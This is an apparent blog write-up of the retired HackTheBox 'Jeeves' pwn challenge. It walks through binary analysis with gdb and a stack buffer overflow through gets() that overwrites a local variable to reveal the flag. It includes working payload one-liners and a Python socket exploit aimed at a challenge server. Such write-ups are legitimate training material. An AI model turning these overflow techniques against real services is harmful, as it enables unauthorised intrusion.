---
layout: post
title: HackTheBox - Jeeves (Pwn) (Retired Challenge)
date: 2021-04-16
categories: HackTheBox pwn
---

Category: Pwn

Difficulty: Easy

Challenge Creator: MinatoTW

## Overview
This challenge is part of Hack The Box's Intro to Binary Exploitation track and, while not particularly difficult, serves as a good introduction to practice some fundamental concepts. In this example we cover some common file analysis techniques, disassemble an executable using gdb, and perform basic byte manipulation and network programming with python 3.


## File Analysis
After downloading and extracting the file, we can begin by running `file` to better understand what this file is. The result shows that the file is a x86-64 linux unstripped executable.
```
$file jeeves
jeeves: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18c31354ce48c8d63267a9a807f1799988af27bf, for GNU/Linux 3.2.0, not stripped

```
Next we'll run `checksec` to see what kind of protections the executable has. In this case, there are no stack canaries that we need to be concerned about overwritting, but ASLR (PIE) is enabled and the NX flag tells us that the stack is marked as non-executable.
```
$checksec --format=json --file=jeeves
{
   "jeeves":{
      "relro":"full",
      "canary":"no",
      "nx":"yes",
      "pie":"yes",
      "rpath":"no",
      "runpath":"no",
      "symbols":"yes",
      "fortify_source":"no",
      "fortified":"0",
      "fortify-able":"3"
   }
}
```
We can also quickly run `strings` to see if there is anything of note. Below we can see what looks to be a prompt, and a `flag.txt` file near some formatting flags `%s`, so perhaps we can get the program to pring the contents of flag.txt somehow.
```
$strings jeeves
...[truncated]...
Hello, good sir!
May I have your name? 
Hello %s, hope you have a good day!
flag.txt
Pleased to make your acquaintance. Here's a small gift: %s
...[truncated]...
```
Since the executable is not stripped, we can disassemble the executable by `disass main` in gdb. The starred line in the output below shows a comparison of the value at `rbp-4` to `0x1337bab3`. If this comparison fails, the application jumps to `main+191` where it exits. If the comparison succeeds, the application eventually calls `open`, `read`, and `print`, which may be associated with the `flag.txt` we found earlier.
```m
(gdb) disass main
Dump of assembler code for function main:
   0x00000000000011e9 <+0>:	endbr64 
   0x00000000000011ed <+4>:	push   %rbp
   0x00000000000011ee <+5>:	mov    %rsp,%rbp
   0x00000000000011f1 <+8>:	sub    $0x40,%rsp
   0x00000000000011f5 <+12>:	movl   $0xdeadc0d3,-0x4(%rbp)
   0x00000000000011fc <+19>:	lea    0xe05(%rip),%rdi        # 0x2008
   0x0000000000001203 <+26>:	mov    $0x0,%eax
   0x0000000000001208 <+31>:	call   0x10a0 <printf@plt>
   0x000000000000120d <+36>:	lea    -0x40(%rbp),%rax
   0x0000000000001211 <+40>:	mov    %rax,%rdi
   0x0000000000001214 <+43>:	mov    $0x0,%eax
   0x0000000000001219 <+48>:	call   0x10d0 <gets@plt>
   0x000000000000121e <+53>:	lea    -0x40(%rbp),%rax
   0x0000000000001222 <+57>:	mov    %rax,%rsi
   0x0000000000001225 <+60>:	lea    0xe04(%rip),%rdi        # 0x2030
   0x000000000000122c <+67>:	mov    $0x0,%eax
   0x0000000000001231 <+72>:	call   0x10a0 <printf@plt>
***0x0000000000001236 <+77>:	cmpl   $0x1337bab3,-0x4(%rbp)
   0x000000000000123d <+84>:	jne    0x12a8 <main+191>
   0x000000000000123f <+86>:	mov    $0x100,%edi
   0x0000000000001244 <+91>:	call   0x10e0 <malloc@plt>
   0x0000000000001249 <+96>:	mov    %rax,-0x10(%rbp)
   0x000000000000124d <+100>:	mov    $0x0,%esi
   0x0000000000001252 <+105>:	lea    0xdfc(%rip),%rdi        # 0x2055
   0x0000000000001259 <+112>:	mov    $0x0,%eax
   0x000000000000125e <+117>:	call   0x10f0 <open@plt>
   0x0000000000001263 <+122>:	mov    %eax,-0x14(%rbp)
   0x0000000000001266 <+125>:	mov    -0x10(%rbp),%rcx
   0x000000000000126a <+129>:	mov    -0x14(%rbp),%eax
   0x000000000000126d <+132>:	mov    $0x100,%edx
   0x0000000000001272 <+137>:	mov    %rcx,%rsi
   0x0000000000001275 <+140>:	mov    %eax,%edi
   0x0000000000001277 <+142>:	mov    $0x0,%eax
   0x000000000000127c <+147>:	call   0x10c0 <read@plt>
   0x0000000000001281 <+152>:	mov    -0x10(%rbp),%rax
   0x0000000000001285 <+156>:	mov    %rax,%rsi
   0x0000000000001288 <+159>:	lea    0xdd1(%rip),%rdi        # 0x2060
   0x000000000000128f <+166>:	mov    $0x0,%eax
   0x0000000000001294 <+171>:	call   0x10a0 <printf@plt>
   0x0000000000001299 <+176>:	mov    -0x14(%rbp),%eax
   0x000000000000129c <+179>:	mov    %eax,%edi
   0x000000000000129e <+181>:	mov    $0x0,%eax
   0x00000000000012a3 <+186>:	call   0x10b0 <close@plt>
   0x00000000000012a8 <+191>:	mov    $0x0,%eax
   0x00000000000012ad <+196>:	leave  
   0x00000000000012ae <+197>:	ret    
End of assembler dump.
```

## Exploitation
We can start by trying to get the comparison to pass and seeing what happens. To do this, we need to write the value 0f `0x1337bab3` into memory at `rbp-4`. If we take a closer look at lines `main+8` and `main+12` in the instructions above, we see that the stack size is is `0x40 (64 bytes)` to `rsp`, and that the value currently stored at `rbp-4` is `0xdeadc0d3`. This means that to overwrite this value we need a buffer of 60 bytes plus our four byte value. Testing this locally gives an interesting prompt that looks promising.

```
$python3 -c "import sys;sys.stdout.buffer.write(b'A' * 60 + b'\xb3\xba\x37\x13')" | ./jeeves 
Hello, good sir!
May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��7, hope you have a good day!
Pleased to make your acquaintance. Here's a small gift: 
```

Note that since we're using python 3 we want to use bytes, and when writing to the terminal we use `sys.stdout.write()` instead of `print()`. Additionally, we write `1337bab3` as `\xb3\xba\x37\x13` to account for the little endian byte ordering of x86 architecture. Consider the following variations of this code and the corresponding hexdumps. Note that example 1 almost gives the correct output, but due to unicode encoding we end up with some extra bytes. Example 2 attempts to convert this to bytes, but we once again end up with the wrong values due to encoding from python 3's `print()`. In example 3 we skip `print()` altogether and send our bytes directly to `sys.stdout.write()` to avoid annoying string manipulation. Luckily this isn't an issue when we send our payload over a network connection, which we will do when creating out remote exploit.

```
Example 1

$python3 -c "print('A' * 60 + '\xb3\xba\x37\x13')" > payload
$hexdump payload
0000000 4141 4141 4141 4141 4141 4141 4141 4141
*
0000030 4141 4141 4141 4141 4141 4141 b3c2 bac2
0000040 1337 000a                              
0000043

Example 2

$python3 -c "print(b'A' * 60 + b'\xb3\xba\x37\x13')" > payload
$hexdump payload
0000000 2762 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 4141 4141 4141 4141 4141 4141
*
0000030 4141 4141 4141 4141 4141 4141 4141 785c
0000040 3362 785c 6162 5c37 3178 2733 000a     
000004d

Example 3

$python3 -c "import sys;sys.stdout.buffer.write(b'A' * 60 + b'\xb3\xba\x37\x13')" > payload
$hexdump payload
0000000 4141 4141 4141 4141 4141 4141 4141 4141
*
0000030 4141 4141 4141 4141 4141 4141 bab3 1337
0000040
```

## Full Implementation (Python 3.9)
```python
#!/usr/bin/python3

import socket

# Create a TCP connection
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the remote host running the application
client.connect(('139.59.178.146', 31974))

# Craft the payload we tested plus '\n' to denote the
# the end of our input
payload = b'A' * 60 + b'\xb3\xba\x37\x13\n'

# Send the payload to the remote host
client.send(payload)

# Receive the response and print it
response = client.recv(4096)
print(response)

# Close the TCP connection
client.close()

```
```
$./exploit.py 
b"Hello, good sir!\nMay I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba7\x13, hope you have a good day!\nPleased to make your acquaintance. Here's a small gift: HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}\n\n"
```